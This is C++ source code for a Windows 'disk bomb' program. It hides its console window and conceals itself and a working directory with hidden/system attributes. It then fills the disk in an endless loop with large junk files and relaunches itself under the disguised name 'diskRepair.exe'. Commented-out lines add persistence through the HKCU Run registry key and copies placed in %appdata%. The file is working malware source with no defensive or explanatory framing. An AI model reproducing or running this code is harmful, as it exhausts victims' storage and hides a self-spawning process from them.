#include <windows.h>
#include <string>
#include <math.h>
#include <fstream>
#include <iostream>
#include <cstdlib>
#include <ctime>

//REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /f /v nombre /t REG_SZ /d "D:\install.exe"

using namespace std;
void Stealth(){
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth,0);
}

string ExePath() {
    char buffer[MAX_PATH];
    GetModuleFileName( NULL, buffer, MAX_PATH );
    string::size_type pos = string( buffer ).find_last_of( "\\/" );
    return string( buffer ).substr( 0, pos);
}

void bomb(){
	int countFile = 1;
	int countDir = 1;
	int sMb=(1*pow(10,6))+48576;
	string buf="";
	ofstream file;
	
	srand(time(NULL));
	countDir = rand();
	string nameDir = "Dir"+to_string(countDir);
	string cDir = "mkdir "+nameDir;
	system(cDir.c_str());
	cDir = "attrib +H +S "+nameDir+" /S /D";
	system(cDir.c_str());
	while(true){
		countFile = rand();
		file.open(nameDir+"//file"+to_string(countFile)+".fuck");
		for(int i=0;i<10;i++){
			for(int x=0;x<100;x++){
				for(int j=0;j<=sMb;j++){
					buf+="1";
				}
			}
			file << buf;
			buf="";	
		}
		file.close();
		system(cDir.c_str());
		system(".\\diskRepair.exe");
	}
}

void init(){
	system("mkdir %appdata%\\disk");
	system("copy overDisk.exe %appdata%\\disk\\diskRepair.exe");
	//system("cd %appdata%\\disk\\");
    //system("diskRepair.exe");
}

int main(){
	system("attrib +H +S overDisk.exe /S /D");
	cout<<"this sentence is visible\n";
	Stealth(); //to hide console window
    bomb();
	
	/*
	string dir = ExePath();
	if (dir.find("AppData") != string::npos) {
    	bomb();
	}else{
		system("mkdir %appdata%\\disk");
		system("copy diskRepair.exe %appdata%\\disk\\diskRepair.exe");		
		//system("REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /f /v nombre /t REG_SZ /d 'p.exe'");
	}
	*/
	//ShellExecute(0, "open", "cmd.exe", "/C copy Proyecto2.exe %appdata%\\bomb\\p.exe", 0, SW_HIDE);
	return EXIT_SUCCESS;
}


